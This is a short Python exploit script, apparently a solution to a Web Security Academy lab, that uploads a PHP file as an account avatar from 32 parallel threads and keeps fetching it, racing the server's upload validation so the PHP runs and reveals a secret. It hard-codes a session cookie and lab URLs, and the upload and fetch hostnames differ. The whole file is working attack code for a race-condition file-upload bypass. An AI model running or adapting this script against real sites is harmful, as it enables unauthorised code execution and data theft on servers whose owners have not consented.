import requests
import threading 


def race():
    url = "https://ac471fa61e5b59dfc0850e7b0020001a.web-security-academy.net/my-account/avatar"
    c = {'session':'cw2DAEeHTe4AkiBT7m3yUMOPpXElMr0Y'}
    while 1:
        with open("lab1.php",'rb') as f:
            files = {"files": f}
            r = requests.post(url, files=files, cookies=c)
        t = requests.get("https://ac481f231ece3d8ec0c756dd009600af.web-security-academy.net/files/avatars/lab1.php", cookies=c)
        if 'Secret' in t.text:
            print(t.text) 
            break

if __name__ == '__main__':
    try:
        for _ in range(32):
            p1 = threading.Thread(target=race)
            p1.start()
        
    except Exception as e:
        print(e)
